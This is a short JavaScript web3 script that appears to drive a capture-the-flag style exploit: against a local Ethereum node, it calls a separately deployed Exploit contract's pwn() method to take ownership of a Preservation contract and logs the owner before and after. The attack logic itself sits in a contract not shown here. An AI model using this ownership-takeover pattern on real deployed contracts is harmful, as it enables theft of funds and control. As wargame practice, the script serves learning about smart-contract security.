// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const preservation = require('./build/contracts/Preservation.json');
const exploit = require('./build/contracts/Exploit.json');

(async function pwn() {
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();

  // We need to read preservation from the console when we deploy with truffle
  // migrate.
  const preservationAddress = '0xde4830101ab29b7e76672b2bc6f15d5f4b9837ca';
  const preservationContract = new web3.eth.Contract(
    preservation.abi,
    preservationAddress,
  );
  const exploitAddress = exploit.networks[networkId].address;
  const exploitContract = new web3.eth.Contract(exploit.abi, exploitAddress);

  let owner = await preservationContract.methods
    .owner()
    .call({from: publicKey});
  console.log('Owner:', owner);
  console.log('Pwning contract by changing owner');
  await exploitContract.methods.pwn().send({from: publicKey});
  owner = await preservationContract.methods.owner().call({from: publicKey});
  console.log('Owner:', owner);
})();
